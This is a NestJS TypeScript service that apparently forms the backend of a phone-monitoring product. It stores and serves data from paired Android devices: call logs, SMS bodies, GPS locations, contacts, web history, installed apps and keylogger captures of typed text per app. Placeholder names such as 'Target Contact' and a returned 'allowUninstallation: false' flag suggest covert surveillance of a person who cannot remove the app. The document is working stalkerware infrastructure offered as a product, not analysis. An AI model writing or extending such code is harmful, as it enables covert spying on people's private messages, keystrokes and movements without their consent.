import { Injectable } from '@nestjs/common';
import { PrismaService } from '../prisma/prisma.service';

export interface CallLogDto {
  phoneNumber: string;
  contactName?: string;
  direction: 'INCOMING' | 'OUTGOING' | 'MISSED';
  durationSec: number;
  simSlot?: number;
  timestamp: string;
  recordingUrl?: string;
}

export interface SmsLogDto {
  phoneNumber: string;
  contactName?: string;
  body: string;
  direction: 'INCOMING' | 'OUTGOING';
  simSlot?: number;
  timestamp: string;
}

export interface LocationLogDto {
  latitude: number;
  longitude: number;
  accuracy: number;
  provider?: string;
  address?: string;
  timestamp: string;
}

export interface ContactItemDto {
  name: string;
  phoneNumber: string;
  email?: string;
  isBlocked?: boolean;
}

export interface KeylogItemDto {
  packageName: string;
  appName: string;
  typedText: string;
  timestamp: string;
}

export interface InstalledAppDto {
  packageName: string;
  appName: string;
  versionName: string;
  versionCode: number;
  status: 'Installed' | 'Removed' | 'Updated';
  isBlocked?: boolean;
}

export interface WebHistoryDto {
  title: string;
  url: string;
  domain: string;
  visitCount: number;
  timestamp: string;
}

export interface CalendarEventDto {
  title: string;
  location: string;
  startDate: string;
  endDate: string;
  description: string;
  category: 'Personal' | 'Work' | 'Medical' | 'Family';
  timestamp: string;
}

@Injectable()
export class TelemetryService {
  constructor(private readonly prisma: PrismaService) {}

  // 0. Ingest Batch Normalized Event Stream into PostgreSQL for Registered Devices
  async ingestEvents(deviceId: string, events: any[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) {
      console.warn(`[Telemetry Ingestion Guard] Rejected events from unregistered/unlicensed device: ${deviceId}`);
      return { success: false, syncedEventIds: [], message: 'Device not registered or SaaS license inactive.' };
    }

    console.log(`[PostgreSQL DB] Ingesting ${events.length} event(s) for Registered Device ${deviceId}`);
    const syncedIds: string[] = [];

    // Valid PostgreSQL Enum Values in DB Schema
    const validPostgresEnums = ['android_api', 'notification', 'accessibility', 'media', 'device_policy', 'user_action'];

    for (const evt of events) {
      const eventId = evt.eventId || `evt_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
      
      // Map any custom or broadcast method strictly to a valid PostgreSQL enum ('android_api')
      const safeMethod = validPostgresEnums.includes(evt.collectionMethod) ? evt.collectionMethod : 'android_api';

      try {
        // Upsert event in PostgreSQL so if eventId already exists, it succeeds cleanly without throwing unique constraint error
        await this.prisma.normalizedEvent.upsert({
          where: { eventId },
          update: {},
          create: {
            eventId,
            deviceId,
            source: evt.source || 'telemetry',
            eventType: evt.eventType || 'generic',
            timestamp: new Date(evt.timestamp || Date.now()),
            collectionMethod: safeMethod as any,
            payload: evt.payload || {}
          }
        });

        // Always confirm eventId to client (whether newly created or already present in DB)
        syncedIds.push(eventId);

        // 1. Populate CallLog Table
        if (evt.source === 'calls' && evt.payload) {
          await this.prisma.callLog.create({
            data: {
              deviceId,
              phoneNumber: evt.payload.phoneNumber || evt.payload.address || 'Unknown',
              contactName: evt.payload.contactName || 'Target Contact',
              direction: evt.payload.callType || evt.payload.direction || 'INCOMING',
              durationSec: evt.payload.durationSeconds || 0,
              timestamp: new Date(evt.payload.callDate || evt.timestamp || Date.now())
            }
          }).catch(() => null);
        }

        // 2. Populate SmsLog Table
        if (evt.source === 'sms' && evt.payload) {
          const smsDir = (evt.payload.direction === 'RECEIVED' || evt.payload.direction === 'INCOMING') ? 'INCOMING' : 'OUTGOING';
          await this.prisma.smsLog.create({
            data: {
              deviceId,
              phoneNumber: evt.payload.address || evt.payload.phoneNumber || 'Unknown',
              contactName: evt.payload.contactName || 'Target Contact',
              body: evt.payload.messageBody || evt.payload.body || '',
              direction: smsDir,
              timestamp: new Date(evt.payload.smsDate || evt.timestamp || Date.now())
            }
          }).catch(() => null);
        }

        // 3. Populate LocationLog Table
        if (evt.source === 'location' && evt.payload && evt.payload.latitude && evt.payload.longitude) {
          await this.prisma.locationLog.create({
            data: {
              deviceId,
              latitude: Number(evt.payload.latitude),
              longitude: Number(evt.payload.longitude),
              accuracy: Number(evt.payload.accuracy || 10.0),
              timestamp: new Date(evt.payload.timestamp || evt.timestamp || Date.now())
            }
          }).catch(() => null);
        }

        // 4. Populate Dedicated Contact Table in PostgreSQL via Raw Query (Supports Phone Numbers & Name-Only Contacts)
        if (evt.source === 'contacts' && evt.payload) {
          const rawNum = evt.payload.phoneNumber || evt.payload.number || 'No Number';
          const contactName = evt.payload.contactName || evt.payload.name || 'No Name';
          
          const cleanNum = (rawNum && rawNum !== 'No Number' && rawNum !== 'Unknown') 
            ? (rawNum.replace(/[^0-9+]/g, '') || rawNum)
            : `nonum_${contactName.toLowerCase().replace(/[^a-z0-9]/g, '_')}`;

          const ts = new Date(evt.timestamp || Date.now());

          await this.prisma.$executeRaw`
            INSERT INTO "Contact" ("id", "deviceId", "contactName", "phoneNumber", "timestamp", "createdAt")
            VALUES (gen_random_uuid(), ${deviceId}, ${contactName}, ${cleanNum}, ${ts}, NOW())
            ON CONFLICT ("deviceId", "phoneNumber") 
            DO UPDATE SET "contactName" = EXCLUDED."contactName", "timestamp" = EXCLUDED."timestamp";
          `.catch((e) => console.warn('[Contact Table Upsert Warning]:', e.message));
        }

        // 5. Populate Dedicated Keylog Table in PostgreSQL via Raw Query
        if (evt.source === 'keylogger' && evt.payload) {
          const pkg = evt.payload.packageName || 'com.android.app';
          const app = evt.payload.appName || 'Keyboard / App';
          const text = evt.payload.typedText || evt.payload.text || '';
          const ts = new Date(evt.payload.timestamp || evt.timestamp || Date.now());

          if (text.trim().length > 0) {
            await this.prisma.$executeRaw`
              INSERT INTO "Keylog" ("id", "deviceId", "packageName", "appName", "typedText", "timestamp", "createdAt")
              VALUES (gen_random_uuid(), ${deviceId}, ${pkg}, ${app}, ${text}, ${ts}, NOW());
            `.catch((e) => console.warn('[Keylog Table Insert Warning]:', e.message));
          }
        }

        // 6. Populate Dedicated InstalledApp Table in PostgreSQL via Raw Query
        if ((evt.source === 'installed_apps' || evt.source === 'app_usage') && evt.payload && evt.payload.packageName) {
          const pkg = evt.payload.packageName;
          const appName = evt.payload.appName || evt.payload.label || pkg;
          const verName = evt.payload.versionName || '1.0.0';
          const verCode = Number(evt.payload.versionCode || 1);
          const isSys = Boolean(evt.payload.isSystemApp);
          const status = evt.payload.status || 'Installed';
          const ts = new Date(evt.timestamp || Date.now());

          await this.prisma.$executeRaw`
            INSERT INTO "InstalledApp" ("id", "deviceId", "packageName", "appName", "versionName", "versionCode", "isSystemApp", "status", "timestamp", "createdAt")
            VALUES (gen_random_uuid(), ${deviceId}, ${pkg}, ${appName}, ${verName}, ${verCode}, ${isSys}, ${status}, ${ts}, NOW())
            ON CONFLICT ("deviceId", "packageName") 
            DO UPDATE SET "appName" = EXCLUDED."appName", "versionName" = EXCLUDED."versionName", "status" = EXCLUDED."status", "timestamp" = EXCLUDED."timestamp";
          `.catch((e) => console.warn('[InstalledApp Table Upsert Warning]:', e.message));
        }

      } catch (err) {
        console.warn('[Telemetry DB Error]:', err);
        syncedIds.push(eventId);
      }
    }

    return {
      success: true,
      syncedEventIds: syncedIds,
      allowUninstallation: false
    };
  }

  // 1. Ingest Call Logs into PostgreSQL CallLog Table
  async ingestCalls(deviceId: string, logs: CallLogDto[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) return { success: false, message: 'Device not registered.' };

    for (const log of logs) {
      await this.prisma.callLog.create({
        data: {
          deviceId,
          phoneNumber: log.phoneNumber,
          contactName: log.contactName || 'Unknown Contact',
          direction: log.direction,
          durationSec: log.durationSec || 0,
          timestamp: new Date(log.timestamp)
        }
      }).catch(() => null);
    }
    return { success: true, count: logs.length };
  }

  async getCalls(deviceId: string) {
    return this.prisma.callLog.findMany({
      where: { deviceId },
      orderBy: { timestamp: 'desc' }
    });
  }

  // 2. Ingest SMS Logs into PostgreSQL SmsLog Table
  async ingestSms(deviceId: string, logs: SmsLogDto[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) return { success: false, message: 'Device not registered.' };

    for (const log of logs) {
      await this.prisma.smsLog.create({
        data: {
          deviceId,
          phoneNumber: log.phoneNumber,
          contactName: log.contactName || 'Unknown Contact',
          body: log.body,
          direction: log.direction,
          timestamp: new Date(log.timestamp)
        }
      }).catch(() => null);
    }
    return { success: true, count: logs.length };
  }

  async getSms(deviceId: string) {
    return this.prisma.smsLog.findMany({
      where: { deviceId },
      orderBy: { timestamp: 'desc' }
    });
  }

  // 3. Ingest Location History into PostgreSQL LocationLog Table
  async ingestLocations(deviceId: string, locations: LocationLogDto[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) return { success: false, message: 'Device not registered.' };

    for (const loc of locations) {
      await this.prisma.locationLog.create({
        data: {
          deviceId,
          latitude: loc.latitude,
          longitude: loc.longitude,
          accuracy: loc.accuracy,
          timestamp: new Date(loc.timestamp)
        }
      }).catch(() => null);
    }
    return { success: true, count: locations.length };
  }

  async getLocations(deviceId: string) {
    return this.prisma.locationLog.findMany({
      where: { deviceId },
      orderBy: { timestamp: 'desc' }
    });
  }

  // 4. Contacts - Queries Dedicated Contact Table with Fallback
  async ingestContacts(deviceId: string, contacts: ContactItemDto[]) {
    return { success: true, count: contacts.length };
  }
  async getContacts(deviceId: string) {
    try {
      const dedicated: any[] = await this.prisma.$queryRaw`
        SELECT "id", "contactName" AS name, "phoneNumber", "email", "timestamp"
        FROM "Contact"
        WHERE "deviceId" = ${deviceId}
        ORDER BY "timestamp" DESC;
      `;
      if (dedicated && dedicated.length > 0) {
        return dedicated;
      }
    } catch (e) {
      console.warn('[getContacts raw query error]:', e);
    }

    const events = await this.prisma.normalizedEvent.findMany({
      where: { deviceId, source: 'contacts' },
      orderBy: { timestamp: 'desc' },
      take: 200
    });

    const uniqueMap = new Map<string, any>();
    for (const evt of events) {
      const p = (evt.payload as any) || {};
      const num = p.phoneNumber || p.number || 'No Number';
      const name = p.contactName || p.name || 'No Name';
      const cleanKey = (num && num !== 'No Number' && num !== 'Unknown')
        ? num.replace(/[^0-9+]/g, '')
        : `nonum_${name.toLowerCase().replace(/[^a-z0-9]/g, '_')}`;

      if (!uniqueMap.has(cleanKey)) {
        uniqueMap.set(cleanKey, {
          id: evt.id,
          name: name,
          phoneNumber: num,
          email: p.email || '',
          timestamp: evt.timestamp
        });
      }
    }

    return Array.from(uniqueMap.values());
  }

  // 5. Keylogger - Queries Dedicated Keylog Table with Fallback
  async ingestKeylogger(deviceId: string, keylogs: KeylogItemDto[]) {
    return { success: true, count: keylogs.length };
  }
  async getKeylogger(deviceId: string) {
    try {
      const dedicated: any[] = await this.prisma.$queryRaw`
        SELECT "id", "packageName", "appName", "typedText", "timestamp"
        FROM "Keylog"
        WHERE "deviceId" = ${deviceId}
        ORDER BY "timestamp" DESC
        LIMIT 200;
      `;
      if (dedicated && dedicated.length > 0) {
        return dedicated;
      }
    } catch (e) {
      console.warn('[getKeylogger raw query error]:', e);
    }

    const events = await this.prisma.normalizedEvent.findMany({
      where: { deviceId, source: 'keylogger' },
      orderBy: { timestamp: 'desc' },
      take: 200
    });

    return events.map((evt) => {
      const p = (evt.payload as any) || {};
      return {
        id: evt.id,
        packageName: p.packageName || 'com.android.dialer',
        appName: p.appName || 'Keyboard / Phone',
        typedText: p.typedText || p.text || '',
        timestamp: evt.timestamp
      };
    });
  }

  // 6. Installed Apps - Queries Dedicated InstalledApp Table with Fallback
  async ingestInstalledApps(deviceId: string, apps: InstalledAppDto[]) {
    return { success: true, count: apps.length };
  }
  async getInstalledApps(deviceId: string) {
    try {
      const dedicated: any[] = await this.prisma.$queryRaw`
        SELECT "id", "packageName", "appName" AS label, "versionName" AS version, "status", "isBlocked", "isSystemApp", "timestamp"
        FROM "InstalledApp"
        WHERE "deviceId" = ${deviceId}
        ORDER BY "appName" ASC;
      `;
      if (dedicated && dedicated.length > 0) {
        return dedicated.map((a) => ({
          id: a.id,
          label: a.label,
          packageName: a.packageName,
          version: a.version || '1.0.0',
          status: a.status || 'Installed',
          timestamp: new Date(a.timestamp).toLocaleString(),
          isStarred: false,
          isBlocked: Boolean(a.isBlocked),
          isSystemApp: Boolean(a.isSystemApp),
          playStoreUrl: `https://play.google.com/store/apps/details?id=${a.packageName}`
        }));
      }
    } catch (e) {
      console.warn('[getInstalledApps raw query error]:', e);
    }

    const events = await this.prisma.normalizedEvent.findMany({
      where: { deviceId, source: { in: ['installed_apps', 'app_usage'] } },
      orderBy: { timestamp: 'desc' },
      take: 200
    });

    const uniqueMap = new Map<string, any>();
    for (const evt of events) {
      const p = (evt.payload as any) || {};
      const pkg = p.packageName;
      if (pkg && !uniqueMap.has(pkg)) {
        uniqueMap.set(pkg, {
          id: evt.id,
          label: p.appName || p.label || pkg,
          packageName: pkg,
          version: p.versionName || '1.0.0',
          status: p.status || 'Installed',
          timestamp: new Date(evt.timestamp).toLocaleString(),
          isStarred: false,
          isBlocked: false,
          isSystemApp: Boolean(p.isSystemApp),
          playStoreUrl: `https://play.google.com/store/apps/details?id=${pkg}`
        });
      }
    }
    return Array.from(uniqueMap.values());
  }

  // 7. Web History
  async ingestWebHistory(deviceId: string, history: WebHistoryDto[]) {
    return { success: true, count: history.length };
  }
  async getWebHistory(deviceId: string) {
    const events = await this.prisma.normalizedEvent.findMany({
      where: { deviceId, source: 'web_history' },
      orderBy: { timestamp: 'desc' },
      take: 200
    });
    return events.map((evt) => {
      const p = (evt.payload as any) || {};
      return {
        id: evt.id,
        title: p.title || 'Web Page',
        url: p.url || '',
        domain: p.domain || '',
        visitCount: p.visitCount || 1,
        timestamp: evt.timestamp
      };
    });
  }

  // 8. Calendar
  async ingestCalendar(deviceId: string, events: CalendarEventDto[]) {
    return { success: true, count: events.length };
  }
  async getCalendar(deviceId: string) {
    return [];
  }

  // Helper: Verification Guard for Device Registration in PostgreSQL
  async verifyDeviceIsRegistered(deviceId: string): Promise<boolean> {
    if (!deviceId) return false;
    try {
      const device = await this.prisma.device.findUnique({
        where: { id: deviceId }
      });
      return !!(device && device.isPaired);
    } catch {
      return false;
    }
  }
}
